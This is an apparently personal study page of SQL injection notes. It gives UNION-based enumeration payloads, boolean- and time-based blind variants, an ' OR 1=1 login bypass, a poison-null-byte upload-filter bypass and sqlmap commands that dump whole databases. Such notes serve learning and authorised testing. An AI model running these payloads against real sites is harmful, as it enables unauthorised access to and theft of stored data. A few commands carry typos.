# ðŸ‡²ðŸ‡¬ SQLi

## IN BAND ( Visibility)

Find Database name:&#x20;

```
UNION SELECT 1,2,database() 
```

Find Table names:&#x20;

{% code overflow="wrap" %}
```
UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name_here' 
```
{% endcode %}

Field Column names:&#x20;

{% code overflow="wrap" %}
```
UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'table_name_here' 
```
{% endcode %}

List Field Names&#x20;

{% code overflow="wrap" %}
```
UNION SELECT 1,2,group_concat(column_name1,':',column_name2 SEPARATOR '<br>') FROM table_name_here 
```
{% endcode %}

Break SQL instruction&#x20;

```
' OR 1=1; -- 
```



## BLIND SQLI (only boolean return is visible)&#x20;

```
UNION SELECT 1,2,3 where database() like '%';-- 
```

{% code overflow="wrap" %}
```
UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'database_name_here' and table_name like '%';--
```
{% endcode %}

{% code overflow="wrap" %}
```
UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='database_name_here' and TABLE_NAME='table_name_here' and COLUMN_NAME like '%'; 
```
{% endcode %}

{% code overflow="wrap" %}
```
UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'database_name_here' and table_name like '%';--
```
{% endcode %}

{% code overflow="wrap" %}
```
UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='database_name_here' and TABLE_NAME='tablename_here' and COLUMN_NAME like '%';--
```
{% endcode %}

&#x20;

{% code overflow="wrap" %}
```
UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='database_name_here' and TABLE_NAME='tablename_here' and COLUMN_NAME like '%' and COLUMN_NAME !='column_name1_here';--
```
{% endcode %}

{% code overflow="wrap" %}
```
admin123' UNION SELECT 1,2,3 from tablename_here where column_name1 like '%' and column_name2 like '%';--
```
{% endcode %}

## BLIND SQLI (based on time response)&#x20;

Same a blind SQLi (boolean)  but use sleep(5) as argument

If query takes more than 5s then it is true:

```
UNION SELECT sleep(5),2 where database() like '%';-- 
```

{% code overflow="wrap" %}
```
UNION SELECT sleep(5),2 FROM information_schema.tables WHERE table_schema = 'database_name' and table_name like '%';-- 
```
{% endcode %}

and so on ...



## POISON NULL BYTE&#x20;

&#x20;If only one type of file is allowed on webserver (ex: only md files ) \
use a character bypass called "Poison Null Byte like this: %00.  \
\=> url encoded format %2500. \
Adding this and then a .md to the end will bypass the 403 error!

```
http://$IP/ftp/package.json.back%2500.md 
```

Why does this work? &#x20;

A Poison Null Byte is actually a NULL terminator. By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string.



## SQLMAP

```
sqlmap -u https://testsite.com/page.php?id=7 --dbs
```

```
sqlmap -u https://testsite.com/page.php?id=7 database-name --tables
```

```
sqlmap -u https://testsite.com/page.php?id=7 database-name -T table_namee -- columns
```

```
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all
```
